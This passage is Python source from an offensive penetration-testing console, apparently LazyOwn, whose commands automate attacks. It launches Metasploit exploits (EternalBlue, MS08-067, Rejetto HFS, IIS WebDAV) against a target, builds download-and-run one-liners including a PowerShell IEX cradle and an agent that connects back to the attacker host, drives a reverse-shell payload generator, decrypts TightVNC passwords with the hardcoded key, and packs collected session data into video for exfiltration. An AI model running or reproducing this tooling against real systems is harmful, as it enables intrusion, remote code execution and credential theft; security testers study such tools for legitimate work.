                write_to_file = input("Do you want to write the shellcode to a file? (y/n): ").strip().lower()
                if write_to_file == 'y':
                    path = os.getcwd()
                    sessions = f"{path}/sessions/"
                    file_name = input("Enter file name to save shellcode: ") or 'shellcode'
                    full_name = f"{sessions}{file_name}"
                    with open(full_name, "w+") as fil:
                        fil.write(shellcode)
                    print_msg(f"[*] Wrote shellcode #{shellcode_id} to {file_name}")
            else:
                print_warn("No results found.")
        except Exception as e:
            print_error(f"An error occurred while performing the search: {e}")

    @cmd2.with_category(lateral_movement_category)
    def do_ligolo(self, line):
        """
        Automates the setup and execution of Ligolo server and client for tunneling and port forwarding.

        :param line: The command line input containing the port number for Ligolo setup.
        :type line: str
        :returns: None
        """

        lhost = self.params["lhost"]
        if not lhost:
            print_error("You must set lhost ex: assign lhost 10.10.10.10 or payload (alias p)")
            return

        if not line:
            print_error("You must pass the port by argument ex: ligolo 3333")
            return

        ligolo_server_path = "sessions/proxy"
        ligolo_client_path = "sessions/agent.exe"
        if not os.path.exists(ligolo_server_path) or not os.path.exists(ligolo_client_path):
            print_warn("Ligolo files not found. Downloading...")
            self.cmd("wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_proxy_0.7.2-alpha_linux_amd64.tar.gz -P sessions/")
            self.cmd("wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_agent_0.7.2-alpha_windows_amd64.zip -P sessions/")
            self.cmd("wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_agent_0.7.2-alpha_linux_amd64.tar.gz -P sessions/")
            self.cmd("cd sessions && unzip ligolo-ng_agent_0.7.2-alpha_windows_amd64.zip && tar -vzxf ligolo-ng_proxy_0.7.2-alpha_linux_amd64.tar.gz && tar -vzxf ligolo-ng_agent_0.7.2-alpha_linux_amd64.tar.gz")
        self.cmd("sudo ip tuntap add user $USER mode tun ligolo && sudo ip link set ligolo up")
        lport = line.strip()
        command_win = f"iwr -uri http://{lhost}/agent.exe -OutFile a.exe; .\\a.exe -connect {lhost}:{lport}"
        command_linux = f"curl http://{lhost}/agent -o a; chmod +x a; ./a -connect {lhost}:{lport}"

        print_msg(f"Windows Command: {command_win}\nLinux Command: {command_linux}")
        choice = input("Enter 1 to windows or 2 to linux: ")
        if choice == "1":
            copy2clip(command_win)
        elif choice == "2":
            copy2clip(command_linux)
        else:
            print_warn("Unrecognized choice. Please select either option 1 or 2.")

        self.cmd(f"cd sessions && ./proxy -laddr \"0.0.0.0:{lport}\" -selfcert")
        print_msg(f"Ligolo server is running on port {RED}{lport}{RESET}. You can stop it by terminating the process.")
        return

    @cmd2.with_category(credential_access_category)
    def do_addusers(self, line):
        """
        Opens or creates the users.txt file in the sessions directory for editing using nano.

        :param line: Not used directly but reserved for future use.

        :returns: None
        """
        users_file_path = os.path.join("sessions", "users.txt")

        if not os.path.exists(users_file_path):
            print_warn(f"{users_file_path} does not exist. Creating the file.")
            os.makedirs(os.path.dirname(users_file_path), exist_ok=True)
            with open(users_file_path, 'w') as f:
                pass  # Create the file

        print_msg(f"Opening {users_file_path} with nano for editing.")
        self.cmd(f"nano {users_file_path} -l")

        return
    @cmd2.with_category(scanning_category)
    def do_windapsearch(self, line):
        """
        Execute the windapsearch tool to perform Active Directory Domain enumeration through LDAP queries.

        This function allows the user to specify various parameters for executing different LDAP query modules
        using windapsearch. It handles user input for domain, username, password, and other options, constructs
        the command, and executes it.

        :param line: Not used in this implementation.
        :returns: None
        """
        if not is_binary_present("go-windapsearch"):
            print_warn("windapsearch binary not found. Installing...")
            print_msg("Choose installation method for windapsearch:")
            print_msg("1. Download pre-compiled binaries (Linux amd64)")
            print_msg("2. Compile from source")
            username = os.getlogin()
            choice = input("Enter choice (1 or 2): ").strip()

            if choice == '1':
                binary_url = "https://github.com/ropnop/go-windapsearch/releases/download/v0.3.0/windapsearch-linux-amd64"
                binary_path = f"/home/{username}/bin/go-windapsearch"

                if not os.path.exists(os.path.dirname(binary_path)):
                    os.makedirs(os.path.dirname(binary_path))

                self.cmd(f"wget -O {binary_path} {binary_url}")
                self.cmd(f"chmod +x {binary_path}")
                print_msg(f"Downloaded and made executable: {binary_path}")

            elif choice == '2':
                repo_url = "https://github.com/ropnop/go-windapsearch.git"
                project_dir = f"/home/{username}/bin/go-windapsearch"

                if not os.path.exists(project_dir):
                    os.makedirs(project_dir)
                command = """go get -u -d github.com/magefile/mage ;
                cd $GOPATH/src/github.com/magefile/mage ;
                go run bootstrap.go"""
                self.cmd(command)
                self.cmd(f"git clone {repo_url} {project_dir}")
                self.cmd(f"cd {project_dir} && go get github.com/magefile/mage")
                self.cmd(f"cd {project_dir} && mage build")
                print_msg("Compiled windapsearch from source.")
                self.cmd(f"{os.path.join(project_dir, 'windapsearch')} --version")

            else:
                print_error("Invalid choice. Please enter 1 or 2.")


        domain = get_domain(self.params["url"]) or input("    [!] Enter the FQDN of the domain (e.g., 'lab.example.com'): ").strip()
        rhost = self.params["rhost"]
        if not domain:
            print_error("Domain is required.")
            return
        choice = input("    [!] Use file credentials.txt? (y/n, default: n): ")
        if choice == 'y':
            path_cred = "sessions/credentials.txt"

            if not os.path.exists(path_cred):
                username = input("    [!] Enter the username with domain (e.g., 'user@domain.com'): ").strip()
                password = input("    [!] Enter the password: ").strip()
            else:
                with open(path_cred, "r") as file:
                    for file_line in file:
                        params = file_line.split(":")
                        if not line:
                            username = params[0]
                        else:
                            username = line
                        password = params[1].replace("\n", "")
        else:
            command = f"windapsearch --dc {rhost} --full -m users -o sessions/{rhost}_windap.json -j y -v y"
            self.cmd(command)
            self.logcsv(f"windapsearch {command}")
            self.cmd(f"cat sessions/{rhost}_windap.json | jq")
            self.do_windapsearchscrapeusers(f'sessions/{rhost}_windap.json')
            return

        use_ntlm = input("    [!] Use NTLM auth? (y/n, default: n): ").strip().lower() or 'n'
        ntlm_command = "--ntlm" if use_ntlm == 'y' else ""

        use_ldaps = input("    [!] Use LDAPS? (y/n, default: n): ").strip().lower() or 'n'
        ldaps_command = "--secure" if use_ldaps == 'y' else ""

        output_file = input("    [!] Enter the output file (optional): ").strip() or f"sessions/{domain}_windap.json"
        output_command = f"-o {output_file}" if output_file else ""

        json_output = input("    [!] Output in JSON format? (y/n, default: n): ").strip().lower() or 'n'
        json_command = "-j" if json_output == 'y' else ""

        verbose = input("    [!] Enable verbose logging? (y/n, default: n): ").strip().lower() or 'n'
        verbose_command = "-v" if verbose == 'y' else ""

        module = input("    [!] Enter the module to use (e.g., 'admin-objects' , 'computers', 'custom'   , 'dns-names', 'dns-zones', 'domain-admins', 'gpos'' , 'groups'   , 'members'  , 'metadata' , 'privileged-users , 'search'   , 'unconstrained', 'user-spns', 'users' ): ").strip() or 'users'
        if not module:
            print_error("Module is required.")
            return

        module_options = input("    [!] Enter any additional options for the module (optional): ").strip()

        command = (
            f"windapsearch -d {domain} -u {username} -p {password} {ntlm_command} {ldaps_command} "
            f"{output_command} {json_command} {verbose_command} -m {module} {module_options}"
        ).strip()

        print_msg(f"Generated command: {command}")
        self.cmd(command)
        self.logcsv(f"windapsearch {command}")
        self.cmd(f"cat {output_file} | jq")
        self.do_windapsearchscrapeusers(output_file)
        return

    @cmd2.with_category(credential_access_category)
    def do_passtightvnc(self, line):
        """
        Decrypts TightVNC passwords using Metasploit.

        This function demonstrates how TightVNC passwords can be decrypted using the known hardcoded DES key
        from the program and Metasploit's `Rex::Proto::RFB::Cipher.decrypt` function.

        Steps:
        - Receives the password in hexadecimal format from the command line input.
        - Creates a Metasploit resource script that includes commands to decrypt the TightVNC password.
        - Executes Metasploit with the created resource script and then deletes the temporary file.
        - Prints the decrypted password.

        :param line: The TightVNC password in hexadecimal format.
        :type line: str
        :returns: None

        Manual execution:
        To manually decrypt a TightVNC password, you would need to:
        - Use Metasploit's `Rex::Proto::RFB::Cipher.decrypt` function with the hardcoded DES key and the hexadecimal password.

        Example:
        passtightvnc D7A514D8C556AADE
        """

        if not line:
            print("No password provided.")
            return

        hex_password = line.strip().upper()
        print_warn(hex_password)
        command = f"""
        key="\\x17\\x52\\x6b\\x06\\x23\\x4e\\x58\\x07"
        require 'rex/proto/rfb'
        Rex::Proto::RFB::Cipher.decrypt ["{hex_password}"].pack('H*'), key
        """.replace("        ", '')
        copy2clip(command)

        try:
            subprocess.run(["msfconsole", "-x", f"irb -r"], check=True)
        except subprocess.CalledProcessError as e:
            print_error(f"Metasploit execution failed: {e}")

        print_msg("TightVNC password decryption completed.")
        return

    @cmd2.with_category(lateral_movement_category)
    def do_shadowsocks(self, line):
        """
        Execute the Shadowsocks tool to create a secure tunnel for network traffic.

        This function allows the user to specify various parameters for configuring and running the Shadowsocks client
        or server. It handles user input for server address, port, password, encryption method, and other options,
        constructs the command, and executes it.

        :param line: Not used in this implementation.
        :returns: None
        """
        if not is_binary_present("sslocal") and not is_binary_present("ssserver"):
            print_warn("Shadowsocks binary not found. Installing...")
            print_msg("Choose installation method for Shadowsocks:")
            print_msg("1. Install using Apt")
            print_msg("2. Install using Cargo")

            choice = input("Enter choice (1 or 2): ").strip()

            if choice == '1':
                self.cmd("sudo apt-get install shadowsocks-libev -y")
                print_msg("Shadowsocks installed using package manager.")

            elif choice == '2':
                self.cmd("cargo install shadowsocks-rust")

            else:
                print_error("Invalid choice. Please enter 1 or 2.")
                return
        if not line:
            mode = input("    [!] Choose mode (server 1 or client 2): ").strip().lower()
        else:
            mode = line

        if mode == '1':
            lport = self.params["lport"]
            password = input("    [!] Enter the Shadowsocks password: ").strip()
            method = input("    [!] Enter the encryption method (e.g., 'aes-256-gcm', 'aes-256-cfb', 'chacha20', etc.): ").strip() or 'aes-256-gcm'

            command = (
                f"ssserver -s '[::]:{lport}' -m '{method}' -k '{password}' -u"
            ).strip()

            print_msg(f"Generated server command: {command}")

            lhost = self.params["lhost"]
            client_command = f"sslocal -b '127.0.0.1:1080' -s '{lhost}:{lport}' -m '{method}' -k '{password}' -u --outbound-bind-interface lo0"
            copy2clip(client_command)
            print_msg(f"Client command copied to clipboard: {client_command}")

            self.cmd(command)

        elif mode == '2':
            rhost = self.params["rhost"]
            rport = self.params["rport"]
            server_address = input("    [!] Enter the Shadowsocks server address: ").strip() or rhost
            server_port = input("    [!] Enter the Shadowsocks server port: ").strip() or rport
            password = input("    [!] Enter the Shadowsocks password: ").strip()
            method = input("    [!] Enter the encryption method (e.g., 'aes-256-gcm', 'aes-256-cfb', 'chacha20', etc.): ").strip() or 'aes-256-gcm'

            command = (
                f"sslocal -b '127.0.0.1:1080' -s '{server_address}:{server_port}' -m '{method}' -k '{password}' -u --outbound-bind-interface lo0"
            ).strip()

            print_msg(f"Generated client command: {command}")
            self.cmd(command)

        else:
            print_error("Invalid mode. Please enter '1' or '2'.")

        return

    @cmd2.with_category(exploitation_category)
    def do_kusa(self, line):
        """
        Execute Kusanagi to generate payloads for command, code, or file injection.

        This function allows the user to specify various parameters for configuring and running Kusanagi to
        generate payloads for reverse/bind shells or injected files/code. It handles user input for target addresses,
        ports, encoding, obfuscation, badchars, and other options, constructs the command, and executes it.

        :param line: Not used in this implementation.
        :returns: None
        """
        if not is_binary_present("kusa"):
            print_warn("Kusanagi binary not found. installing")
            self.cmd("pip3 install kusanagi")
            return

        print_msg("Kusanagi - Payload Generator and Injector")
        if not line:
            mode = input("    [!] Choose mode (cmd 1, code 2): ").strip().lower()
        else:
            mode = line

        if mode == '1':
            print_msg("Command Injection selected.")
            rhost = input(f"    [!] Enter the target host [default: {self.params['rhost']}]: ").strip() or self.params['rhost']
            rport = input(f"    [!] Enter the target port [default: {self.params['rport']}]: ").strip() or self.params['rport']
            copy_payload = input("    [!] Copy payload to clipboard? (y/n): ").strip().lower() == 'y'
            obfuscate = input("    [!] Obfuscate payload? (y/n): ").strip().lower() == 'y'
            badchars = input("    [!] Enter badchars to filter (e.g. '/$') or leave blank: ").strip()
            encoders = input("    [!] Enter encoders (e.g., base64 url) or leave blank: ").strip()
            command = f"kusa cmd {rhost} {rport}"
            if obfuscate:
                command += " --obf"
            if badchars:
                command += f" -b '{badchars}'"
            if encoders:
                command += f" --enc {encoders}"

            print_msg(f"Generated command: {command}")

            if copy_payload:
                copy2clip(command)
                print_msg("Command copied to clipboard.")

            self.cmd(command)

        elif mode == '2':
            print_msg("Code Injection selected.")
            rhost = input(f"    [!] Enter the target host [default: {self.params['rhost']}]: ").strip() or self.params['rhost']
            rport = input(f"    [!] Enter the target port [default: {self.params['rport']}]: ").strip() or self.params['rport']
            language = input("    [!] Enter the language (e.g., python, php) or leave blank for all: ").strip()
            shell_type = input("    [!] Enter the shell type (e.g., bash, sh, cmd, dash, zsh, PowerShell) or leave blank for all: ").strip()
            obfuscate = input("    [!] Obfuscate payload? (y/n): ").strip().lower() == 'y'
            badchars = input("    [!] Enter badchars to filter (e.g. '/$') or leave blank: ").strip()
            encoders = input("    [!] Enter encoders (e.g., base64 url) or leave blank: ").strip()

            command = f"kusa code {rhost} {rport}"
            if language:
                command += f" -l {language}"
            if shell_type:
                command += f" -s {shell_type}"
            if obfuscate:
                command += " --obf"
            if badchars:
                command += f" -b '{badchars}'"
            if encoders:
                command += f" --enc {encoders}"

            print_msg(f"Generated command: {command}")
            self.cmd(command)
        return

    @cmd2.with_category(recon_category)
    def do_windapsearchscrapeusers(self, line):
        """
        Extracts usernames from a JSON output generated by go-windapsearch and appends them
        to the file sessions/users.txt.

        The function loads the JSON file, parses the `sAMAccountName` attribute for each user, and appends
        the username to the sessions/users.txt file.

        :param line: Path to the JSON file (e.g., 'sessions/<dc_ip>_windap.json').
        :returns: None
        """
        json_file = line.strip()

        if not os.path.exists(json_file):
            print_error(f"Error: El archivo {json_file} no existe.")
            return

        try:
            with open(json_file, 'r') as f:
                data = json.load(f)

            user_file = "sessions/users.txt"
            with open(user_file, 'a') as uf:
                for entry in data:
                    if 'sAMAccountName' in entry:
                        uf.write(entry['sAMAccountName'] + '\n')
                        print_msg(f"Agregado usuario: {entry['sAMAccountName']}")

            print_msg(f"Todos los usuarios se han agregado a {user_file}.")

        except json.JSONDecodeError:
            print_error(f"Error: No se pudo decodificar el archivo {json_file}. Asegúrate de que sea un JSON válido.")
        except Exception as e:
            print_error(f"Error: {str(e)}")

    @cmd2.with_category(exploitation_category)
    def do_downloader(self, line):
        """
        Generate a downloader command for files in the sessions directory.

        This function lists all files in the 'sessions' directory recursively, excluding certain file extensions.
        The user can select a file, choose a download method, and the command is generated and copied to the clipboard.

        :param line: Optional output filename for the downloader command.
        :returns: None
        """
        excluded_extensions = ['.html', '.xml', '.nmap', '.dot', '.png', '.xsl', '.txt', '.json']
        file_list = []
        for root, dirs, files in os.walk("sessions"):
            for file in files:
                if not any(file.endswith(ext) for ext in excluded_extensions):
                    file_list.append(os.path.join(root, file))

        if not file_list:
            print_error("No files found in the sessions directory.")
            return

        print_msg("Select a file to download:")
        for idx, file in enumerate(file_list, 1):
            print_msg(f"  {idx}) {file}")

        file_choice = input(f"    [!] Enter the number of the file (1-{len(file_list)}): ").strip()

        try:
            file_choice = int(file_choice)
            if file_choice < 1 or file_choice > len(file_list):
                print_warn("Invalid choice.")
                return
            selected_file = file_list[file_choice - 1]
        except ValueError:
            print_error("Invalid input. Please enter a number.")
            return


        print_msg("Select the download method:")
        methods = [
            "curl",
            "wget",
            "Invoke-WebRequest (IWR)",
            "certutil.exe",
            "bitsadmin.exe",
            "IEX"
        ]
        for idx, method in enumerate(methods, 1):
            print_warn(f"  {idx}) {method}")

        method_choice = input(f"    [!] Enter the number of the download method (1-{len(methods)}): ").strip()

        try:
            method_choice = int(method_choice)
            if method_choice < 1 or method_choice > len(methods):
                print_warn("Invalid choice.")
                return
            selected_method = methods[method_choice - 1]
        except ValueError:
            print_error("Invalid input. Please enter a number.")
            return


        lhost = self.params["lhost"]

        output_file = line.strip() if line else os.path.basename(selected_file)

        command = ""
        if selected_method == "curl":
            command = f"curl -o {output_file} http://{lhost}/{selected_file}"
        elif selected_method == "wget":
            command = f"wget -O {output_file} http://{lhost}/{selected_file}"
        elif selected_method == "Invoke-WebRequest (IWR)":
            command = f"Invoke-WebRequest -Uri http://{lhost}/{selected_file} -OutFile {output_file}"
        elif selected_method == "certutil.exe":
            command = f"certutil.exe -urlcache -split -f http://{lhost}/{selected_file} {output_file}"
        elif selected_method == "bitsadmin.exe":
            command = f"bitsadmin.exe /transfer myDownloadJob http://{lhost}/{selected_file} {output_file}"
        elif selected_method == "IEX":
            choice = input("    [!] Enter extra command to exec after download: (Blank to none)")
            command = f"powershell -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://{lhost}/{selected_file}');{choice}\""

        command = command.replace("sessions/",'')
        copy2clip(command)
        print_msg(f"Generated command copied to clipboard: {command}")

    @cmd2.with_category(scanning_category)
    def do_ldapsearch(self, line):
        """
        Executes an LDAP search against a target remote host (rhost) and saves the results.

        This function performs the following tasks:
        1. Extracts the target remote host (rhost) from the class parameters.
        2. Verifies if the rhost is valid using a custom `check_rhost` function.
        3. Retrieves the domain information from the parameters.
        4. Ensures that the 'ldapsearch' binary is available on the system. If it's missing, the function attempts to install it using the system's package manager (`apt`).
        5. Constructs the LDAP search query based on the domain information, splitting the domain into components to form the correct base DN (Distinguished Name).
        6. Runs the LDAP search with the following options:
            - `-x`: Simple authentication (anonymous bind).
            - `-H`: Specifies the LDAP server URL (using the rhost).
            - `-b`: Specifies the search base (constructed from the domain).
            - `-s sub`: Indicates the search scope, where 'sub' performs a subtree search.
        7. Saves the result of the search to a log file under the 'sessions' directory, named based on the rhost.
        8. Displays the log file content and checks for any 'lock' entries, which could indicate locked accounts or security incidents.
        9. Extracts `userPrincipalName` attributes from the log, parses them, and appends the usernames (without domain) to a users.txt file for further analysis.

        This function is useful in penetration testing engagements where LDAP enumeration is part of the reconnaissance phase. It automates LDAP queries and extracts useful user information, which could assist in credential harvesting, password spraying, or other user-based attacks.
        """
        path = os.getcwd()
        rhost = self.params["rhost"]
        if not check_rhost(rhost):
            return
        domain = self.params["domain"]
        if not is_binary_present("ldapsearch"):
            print_warn("ldapsearch not found installing...")
            self.cmd("sudo apt install ldapsearch -y")
        log = f"sessions/ldapsearch_{rhost}.txt"
        args = domain.split(".")
        if not os.path.exists(f"{path}/sessions/credentials.txt"):
            command = f"ldapsearch -x -H ldap://{rhost} -b 'dc={args[0]},dc={args[1]}' -s sub > {log}"
        else:
            if line:
                credentials = get_credentials(ncred=int(line))
            else:
                credentials = get_credentials()

            if not credentials:
                return
            for username, password in credentials:
                command = "ldapsearch -x -H ldap://{rhost} -D \"{username}@{domain}\" -w \"{password}\" -b 'dc={args[0]},dc={args[1]}' \"(objectClass=user)\" sAMAccountName | grep \"sAMAccountName\" | awk '{print $2}' > sessions/ldapsearch_{rhost}.txt".replace("{rhost}",rhost).replace("{username}",username).replace("{password}",password).replace("{domain}",domain).replace("{args[0]}",args[0]).replace("{args[1]}",args[1])

        self.cmd(command)
        self.cmd(f"cat {log} |  sed 's/requesting://' >> sessions/users.txt")
        self.cmd(f"tac sessions/users.txt | grep -v '^$' | sponge sessions/users.txt")
        return

    @cmd2.with_category(exploitation_category)
    def do_eternal(self, line):
        """
        Automates the EternalBlue (MS17-010) exploitation process using Metasploit.

        This function performs the following tasks:
        1. Selects the EternalBlue Metasploit module for Windows SMB exploitation.
        2. Displays the current options for the module.
        3. Sets the required payload options, such as `LHOST` and `RHOST`.
        4. Executes the exploit and attempts to gain access to the target machine.

        :param line: Command line input that provides the LHOST and RHOST.
        :type line: str
        :returns: None
        """

        rhost = self.params["rhost"]
        lhost = self.params["lhost"]
        lport = self.params["lport"]


        if not rhost or not lhost:
            print_warn("RHOST and LHOST must be specified.")
            return

        rc_file_path = "/tmp/eternalblue.rc"
        with open(rc_file_path, "w") as file:
            file.write(f"""
            use exploit/windows/smb/ms17_010_eternalblue
            set RHOSTS {rhost}
            set LHOST {lhost}
            set LPORT {lport}
            set SMBPass {start_pass}
            set SMBUser {start_user}
            run
            """)

        subprocess.run(["msfconsole", "-r", rc_file_path], check=True)

        if os.path.exists(rc_file_path):
            os.remove(rc_file_path)

        print_msg(f"Executed EternalBlue exploitation on {rhost} with listener {lhost}.")
        return

    @cmd2.with_category(recon_category)
    def do_cve(self, line):
        """
        Search for a CVE using the CIRCL API.

        This function sends a GET request to the CIRCL API to retrieve CVE details
        and prints relevant information to the screen.

        :param line: A string containing the CVE ID (optional).
        :returns: None
        """
        if not line.strip():
            line = generate_random_cve_id()
            print_msg(f"No CVE ID provided. Generated ID: {line}")

        url = f"https://cve.circl.lu/api/cve/{line}"

        try:
            response = requests.get(url)

            if response.status_code != 200:
                print_error(f"Failed to retrieve data: HTTP {response.status_code}")
                return

            cve_data = response.json()

            cwe = cve_data.get("cwe", "No CWE info")
            cve_id = cve_data.get("id", "No ID")
            references = cve_data.get("references", [])
            summary = cve_data.get("summary", "No summary available")
            assigner = cve_data.get("assigner", "No assigner info")
            published = cve_data.get("Published", "No publish date")
            modified = cve_data.get("Modified", "No modification date")

            print_msg(f"[*] CWE: {cwe}")
            print_msg(f"[*] ID: {cve_id}")
            print_msg(f"[*] References: {', '.join(references) if references else 'No references'}")
            print_msg(f"[*] Summary: {summary}")
            print_msg(f"[*] Assigner: {assigner}")
            print_msg(f"[*] Published: {published}")
            print_msg(f"[*] Modified: {modified}")

        except requests.exceptions.RequestException as req_e:
            print_error(f"A request error occurred: {req_e}")
        except ValueError as json_e:
            print_error(f"Error parsing JSON response: {json_e}")
        except Exception as e:
            print_error(f"An error occurred: {e}")

    @cmd2.with_category(exfiltration_category)
    def do_evidence(self, line=''):
        """
        Compresses the 'sessions' folder and encodes it into a video using the lazyown_infinitestorage.py script.
        If a filename is provided as an argument, it decodes the specified video instead.

        This function operates in two modes depending on the input:
        1. **Encode Mode (default)**:
        - Compresses the contents of the 'sessions' directory into a ZIP file named 'sessions.zip'.
        - Utilizes the lazyown_infinitestorage.py script to convert the ZIP file into a high-definition video file named 'encoded_output.avi' with a frame size of 1920x1080 and a frame rate of 25 FPS.

        2. **Decode Mode**:
        - When the 'line' parameter contains the string "decode", it lists all available video files in the 'sessions' directory (files with .mp4, .mkv, or .avi extensions).
        - If there are no video files present, it prints an error message and exits.
        - Prompts the user to select a video by entering its corresponding number.
        - Constructs a command to decode the selected video file using the lazyown_infinitestorage.py script, outputting the decoded result to a specified directory.

        :param line: An optional parameter that, when provided, indicates that the user wants to decode a video. If not provided, the function operates in encode mode.
        :type line: str
        :returns: None

        Example usage:
            - To compress and encode: do_evidence()
            - To decode a video: do_evidence('decode')

        Notes:
        - The 'sessions' directory must exist and contain files for encoding.
        - The lazyown_infinitestorage.py script must be present in the specified directory.
        - Ensure that the output paths for both encoding and decoding do not conflict with existing files.
        """
        sessions_dir = 'sessions'
        zip_file_path = 'sessions.zip'


        if line and line.startswith("decode"):
            video_files = [f for f in os.listdir(sessions_dir) if f.endswith(('.mp4', '.mkv', '.avi'))]
            if not video_files:
                print_error("No hay videos en la carpeta 'sessions'.")
                return

            print_msg("Videos disponibles para decodificar:")
            for idx, video in enumerate(video_files, start=1):
                print_msg(f"{idx}: {video}")


            choice = input("Elige el número del video que deseas decodificar: ")
            try:
                choice = int(choice)
                if 1 <= choice <= len(video_files):
                    video_file = video_files[choice - 1]
                else:
                    print_error("Elección no válida.")
            except ValueError:
                print_error("Por favor, ingresa un número válido.")

            path = os.getcwd()
            video_full_path = f"{path}/sessions/{video_file}"
            if not os.path.isfile(video_full_path):
                print_error(f"Error: {video_full_path} no existe.")
                return

            command = [
                'python3', 'modules_ext/lazyown_infinitestorage/lazyown_infinitestorage.py',
                '--mode', 'decode',
                '--input', video_full_path,
                '--output', 'sessions/decoded_output',
                '--frame_size', '1920', '1080',
                '--fps', '25'
            ]
            print_msg(f"Decodificando {video_file}...")

        else:

            self.cmd(f'zip -r {zip_file_path} {sessions_dir}')
            print_msg(f"Carpeta {sessions_dir} comprimida en {zip_file_path}.")


            command = [
                'python3', 'modules_ext/lazyown_infinitestorage/lazyown_infinitestorage.py',
                '--mode', 'encode',
                '--input', zip_file_path,
                '--output', 'sessions/encoded_output.avi',
                '--frame_size', '1920', '1080',
                '--fps', '25'
            ]
            print_msg("Codificando en video...")


        try:
            result = subprocess.run(command, check=True)
            print_msg("Comando ejecutado con éxito: ".join(command))
        except subprocess.CalledProcessError as e:
            print_error(f"Error al ejecutar el comando: {e}")


        if not line:
            video_files = [f for f in os.listdir(sessions_dir) if f.endswith(('.mp4', '.mkv', '.avi'))]
            if not video_files:
                print_error("No hay videos en la carpeta 'sessions'.")
                return

            print_msg("Videos disponibles para decodificar:")
            for idx, video in enumerate(video_files, start=1):
                print_msg(f"{idx}: {video}")


            choice = input("Elige el número del video que deseas decodificar: ")
            try:
                choice = int(choice)
                if 1 <= choice <= len(video_files):
                    self.do_evidence(video_files[choice - 1])
                else:
                    print_error("Elección no válida.")
            except ValueError:
                print_error("Por favor, ingresa un número válido.")

        return

    @cmd2.with_category(exploitation_category)
    def do_rejetto_hfs_exec(self, line):
        """
        HttpFileServer version 2.3. Vulnerable using the module rejetto_hfs_exec of metasploit
        :param line: Command line input that provides the LHOST and RHOST.
        :type line: str
        :returns: None
        """

        rhost = self.params["rhost"]
        lhost = self.params["lhost"]
        lport = self.params["lport"]

        if not rhost or not lhost:
            print_warn("RHOST and LHOST must be specified.")
            return

        rc_file_path = "/tmp/rejetto_hfs_exec.rc"
        with open(rc_file_path, "w") as file:
            file.write(f"""
            use exploit/windows/http/rejetto_hfs_exec
            set RHOSTS {rhost}
            set LHOST {lhost}
            set LPORT {lport}
            run
            """)

        subprocess.run(["msfconsole", "-r", rc_file_path], check=True)

        if os.path.exists(rc_file_path):
            os.remove(rc_file_path)

        print_msg(f"Executed rejetto_hfs_exec exploitation on {rhost} with listener {lhost}.")
        return

    @cmd2.with_category(exploitation_category)
    def do_ms08_067_netapi(self, line):
        """
        SMB CVE-2008-4250. Vulnerable using the module ms08_067_netapi of metasploit
        :param line: Command line input that provides the LHOST and RHOST.
        :type line: str
        :returns: None
        """

        rhost = self.params["rhost"]
        lhost = self.params["lhost"]
        lport = self.params["lport"]

        if not rhost or not lhost:
            print_warn("RHOST and LHOST must be specified.")
            return

        rc_file_path = "/tmp/ms08_067_netapi.rc"
        with open(rc_file_path, "w") as file:
            file.write(f"""
            use exploit/windows/smb/ms08_067_netapi
            set RHOSTS {rhost}
            set LHOST {lhost}
            set LPORT {lport}
            run
            """)

        subprocess.run(["msfconsole", "-r", rc_file_path], check=True)

        if os.path.exists(rc_file_path):
            os.remove(rc_file_path)

        print_msg(f"Executed ms08_067_netapi exploitation on {rhost} with listener {lhost}.")
        return

    @cmd2.with_category(command_and_control_category)
    def do_automsf(self, line):
        """
        Try to check if Vulnerable using the module passed by argument of lazyown example automsf exploit/windows/iis/iis_webdav_upload_asp to use in metasploit
        :param line: Command line input that provides the LHOST and RHOST.
        :type line: str
        :returns: None
        """

        rhost = self.params["rhost"]
        lhost = self.params["lhost"]
        lport = self.params["lport"]
        ultimo_elemento = line.split('/')[-1]

        if not rhost or not lhost:
            print_warn("RHOST and LHOST must be specified.")
            return

        rc_file_path = f"/tmp/{ultimo_elemento}.rc"
        with open(rc_file_path, "w") as file:
            file.write(f"""
            use {line}
            set RHOSTS {rhost}
            set LHOST {lhost}
            set LPORT {lport}
            run
            """)

        subprocess.run(["msfconsole", "-r", rc_file_path], check=True)

        if os.path.exists(rc_file_path):
            os.remove(rc_file_path)

        print_msg(f"Executed {ultimo_elemento} exploitation on {rhost} with listener {lhost}.")
        return

    @cmd2.with_category(command_and_control_category)
    def do_iis_webdav_upload_asp(self, line):
        """
        (CVE-2017-7269). Vulnerable using the module iis_webdav_upload_asp of metasploit
        :param line: Command line input that provides the LHOST and RHOST.
        :type line: str
        :returns: None
        """

        rhost = self.params["rhost"]
        lhost = self.params["lhost"]
        lport = self.params["lport"]

        if not rhost or not lhost:
            print_warn("RHOST and LHOST must be specified.")
            return

        rc_file_path = "/tmp/iis_webdav_upload_asp.rc"
        with open(rc_file_path, "w") as file:
            file.write(f"""
            use exploit/windows/iis/iis_webdav_upload_asp
            set RHOSTS {rhost}
            set LHOST {lhost}
            set LPORT {lport}
            run
            """)

        subprocess.run(["msfconsole", "-r", rc_file_path], check=True)

        if os.path.exists(rc_file_path):
            os.remove(rc_file_path)

        print_msg(f"Executed iis_webdav_upload_asp exploitation on {rhost} with listener {lhost}.")
        return

    @cmd2.with_category(miscellaneous_category)
    def do_nano(self, line):
        """
        Opens or creates the file using line in the sessions directory for editing using nano.

        :param line: name of the file to use in nano in session directory.

        :returns: None
        """
        if not line:
            line = input ("    [!] enter the filename: ") or 'unamed_lazyownfile'
        users_file_path = os.path.join("sessions", line)
        print_msg(users_file_path)
        if not os.path.exists(users_file_path):
            print_warn(f"{users_file_path} does not exist. Creating the file.")
            os.makedirs(os.path.dirname(users_file_path), exist_ok=True)
            with open(users_file_path, 'w') as f:
                pass

        print_msg(f"Opening {users_file_path} with nano for editing.")
        self.cmd(f"nano {users_file_path} -l")

        return

    @cmd2.with_category(lateral_movement_category)
    def do_nc(self, line):
        """
        Runs `nc` with the specified port for listening.

        This function starts a `nc` listener on the specified local port. It can use a port defined in the `lport` parameter or a port provided as an argument.

        Usage:
            nc <port>

        :param line: The port number to use for the `nc` listener. If not provided, it defaults to the `lport` parameter.
        :type line: str
        :returns: None

        Manual execution:
        1. Ensure that `nc` is installed and accessible from your command line.
        2. The port number can either be provided as an argument or be set in the `lport` parameter of the function.
        3. Run the function to start `nc` on the specified port.

        If no port is provided as an argument, the function will use the port specified in the `lport` parameter. If a port is provided, it overrides the `lport` value.

